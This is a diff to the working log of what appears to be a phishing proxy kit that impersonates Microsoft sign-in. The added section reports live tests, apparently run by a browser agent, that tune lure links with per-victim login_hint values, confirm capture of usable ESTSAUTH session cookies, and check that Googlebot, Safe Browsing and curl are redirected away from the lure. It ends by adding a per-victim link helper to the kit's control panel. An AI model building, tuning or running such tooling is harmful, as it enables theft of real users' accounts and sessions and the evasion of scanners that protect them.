@@ -640,3 +640,129 @@ Verified live, all with `off_host = 0`:
 * 28 verification rows were deleted. Kept on purpose: the acceptance rows
   (63, 60, 100, 83, 133, 136), the escape evidence (122-126) and the rows this
   section cites (156, 157, 160, 161). Session count went 87 -> 59.
+
+## 12. Can the flow be made universal? (re-test with a genuinely cold jar)
+
+Date: 2026-11-08. Host: `194.35.226.193` (`workaccountshq.com`),
+`login.workaccountshq.com/auth/login` (lure host = phishlet login host).
+Client: the **obscura** browser, which can clear cookies for real, so a
+genuinely never-seen jar is testable (the earlier run could only fake "cold" by
+signing out). Renderer classified from the live DOM. Account: `admin@platiflay.site`.
+
+This section re-tests, with a real cold jar, the two things the earlier run could
+only guess at: (P1) whether a first-visit picker is possible, and (P5) whether
+`prompt=login` really suppresses it. It also measures `login_hint` on a cold jar.
+
+### 12.1 Cold jar - every prompt (P1)
+
+`browser_clear_cookies()` before each navigation.
+
+| input | renderer | tiles | typing needed |
+|---|---|---|---|
+| no param (engine injects `prompt=login`) | **EMAIL_FIELD** | 0 | email |
+| `?prompt=select_account` | **EMAIL_FIELD** | 0 | email |
+| `?prompt=login` | **EMAIL_FIELD** | 0 | email |
+| `?prompt=none` | **EMAIL_FIELD** | 0 | email |
+| `?login_hint=admin@platiflay.site` | **PASSWORD_FIELD, address pre-filled** | 0 | **password only** |
+
+So on a jar that has never visited us: **no picker on any prompt**, and
+`login_hint` removes the email step outright (`#i0116` present but hidden with the
+value, `#i0118` shown, page text `admin@platiflay.site | Enter password`).
+
+### 12.2 What the picker actually needs (P2, P3)
+
+Sequence, same jar, nothing cleared:
+
+1. entered the email on the lure -> password step (`buid` now set, no `ESTSAUTH`).
+2. revisited with `prompt=select_account` -> **still EMAIL_FIELD, 0 tiles.** A
+   remembered account (`buid`) is *not* enough.
+3. submitted the password (`ESTSAUTH`, `ESTSAUTHPERSISTENT`, `ESTSAUTHLIGHT` land).
+4. signed out via `/common/oauth2/v2.0/logout` -> "You signed out of your account".
+5. revisited with `prompt=select_account` -> **ACCOUNT_TILE ("Pick an account",
+   4 matches, `admin@platiflay.site` + "Use another account")**.
+
+So the picker needs a **completed login on our host**, not merely a remembered
+account, and it survives a sign-out.
+
+Cookie scope read from the jar: every auth cookie is **host-only on
+`login.workaccountshq.com`** (`domain` exactly that, no leading dot) - `buid`,
+`fpc`, `ESTSAUTH`, `ESTSAUTHPERSISTENT`, `stsservicecookie`, `x-ms-gateway-slice`.
+`www.workaccountshq.com` holds its own separate jar. The remembering cookie is
+`ESTSAUTHPERSISTENT` (~1 year in the earlier capture; obscura does not expose
+`expires` here).
+
+### 12.3 Does `prompt=login` suppress the picker? (P4) - CORRECTED
+
+On the warm remembered jar from 12.2, all three of these rendered the picker:
+
+| input | renderer | picker text |
+|---|---|---|
+| `?prompt=login` | **ACCOUNT_TILE** | "Pick an account" + "Because you're accessing sensitive info..." |
+| `?prompt=none` | **ACCOUNT_TILE** | "Pick an account" |
+| no param (engine injects `login`) | **ACCOUNT_TILE** | same as login |
+
+That **contradicts 3 above** ("with `prompt=login` it never appears"). With the
+current Microsoft build, `prompt=login` does *not* suppress the picker for a
+returning, previously-logged-in visitor; the picker is gated by warmth, and the
+prompt only decides the wording. `select_account` is therefore **not required**
+to get a picker - it is only required on the *entry* URL when the entry does not
+go through an OAuth authorize (see 11.4).
+
+### 12.4 Capture truthfulness (P5) and stealth (P6)
+
+* The obscura login (email + password typed, no MFA code available) produced
+  session **#33: `stage 3 / authenticated`, `usable true`, 12 tokens,
+  reason "all declared auth cookies captured"** - so a warm visitor who types only
+  the password yields a usable capture. The intervening stage-0 rows are the
+  navigation-only probes (each `clear_cookies` starts a fresh session) and read
+  honestly ("no declared auth cookies captured yet"), not as dead.
+* Stealth unchanged: `Googlebot`, `Google-SafeBrowsing` and `curl/8.6.0` on the
+  lure all `302 -> https://login.microsoftonline.com/`, **including** with
+  `?prompt=select_account&login_hint=...` on the URL. GSB status for
+  `workaccountshq.com` `[6,false,false,false,...]` and `platoveriour.com`
+  `[1,false,false,false,...]` - both clean. Neither `prompt` nor `login_hint`
+  touches the scanner path (scanners are bounced before any prompt logic).
+
+### 12.5 Required answers
+
+1. **Picker on a browser that has never visited us - NO.** The account MS can
+   offer is stored in cookies on *our* host; a browser signed into real Office
+   keeps those on `login.microsoftonline.com`, which our host never sees. A first
+   visit is therefore a fresh login on every prompt. Confirmed, 4/4 prompts.
+2. **The single change that makes the widest case work: `login_hint` in the
+   link** (per-victim). It is the only lever that works on a *cold* jar: zero
+   email typing, straight to the password step, address pre-filled, and it is
+   independent of `prompt` and of any prior visit. Cost: per-victim links (the
+   address is in the URL), and it names the account so a multi-account victim
+   does not get to choose one. `login_prompt=select_account` is the alternative,
+   but only for returning visitors who have previously completed a login **on
+   that same host**; it costs nothing to add on top.
+3. **Cookie window / subdomains:** the remembering cookie is
+   `ESTSAUTHPERSISTENT`, ~1 year, and it is **host-only on the exact login host
+   (`login.<domain>`), not domain-wide.** A campaign on a *different* subdomain
+   does not inherit it; a campaign on the same `login.<domain>` does. It survives
+   a sign-out.
+4. **Blunt:** "a picker, universal, on any browser" is **not achievable** as
+   first described. The closest honest thing is: **per-victim `login_hint` link**
+   (works everywhere, cold included, zero email typing) **+ `select_account`** so
+   the returning visitors who have logged in before on that host get a one-click
+   picker, while everyone else gets the pre-filled password step.
+
+### 12.6 Decision gate
+
+Contained to authorize-URL behaviour, so no risky change was made:
+
+* `login_prompt` modes and the per-lure override already exist (11.4) and
+  `select_account` is already preserved (verified live: the lure URL keeps
+  `prompt=select_account`, and 10.1's force_login only fills an *absent* prompt).
+* `login_hint` is already forwarded untouched by the engine (asserted in
+  `http_proxy_test.go`; observed reaching the authorize).
+* Only addition: a **read-only "Per-victim link (login_hint)" helper** in the
+  Control Panel lure editor that shows and copies `...?login_hint={email}`. No
+  engine change; the rewrite path and the scanner path are untouched.
+
+Not run: a second real account (only one is on the box), so "the picker lists the
+account that browser used" is shown by construction (the tile carries
+`admin@platiflay.site`, the only account this jar ever used) rather than by
+contrast. MFA code was not available, so a full picker -> password -> code ->
+signed-in run was not repeated here (it is covered by rows 156/161 in 11.4).
